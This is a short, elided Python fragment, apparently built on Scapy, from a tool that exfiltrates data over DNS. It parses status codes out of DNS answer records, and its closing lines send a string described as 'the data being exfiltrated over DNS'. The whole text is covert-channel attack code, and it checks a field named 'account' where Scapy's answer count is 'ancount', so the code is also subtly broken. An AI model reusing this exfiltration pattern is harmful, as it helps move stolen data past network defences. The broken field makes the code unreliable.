...
def process(response):
	if response.haslayer(DNS) and response[DNS].account > 0:
		code = str(response[DNS].an.rdata)[-1]
		if int(code) ==1:
			print("Received successfully")
		elif int(code) ==2:
			print("Acknowledged and transmission")
		else:
...
data = "This is the data being exfiltrated over DNS"
sendData(data)
data = "R"
sendData(data)
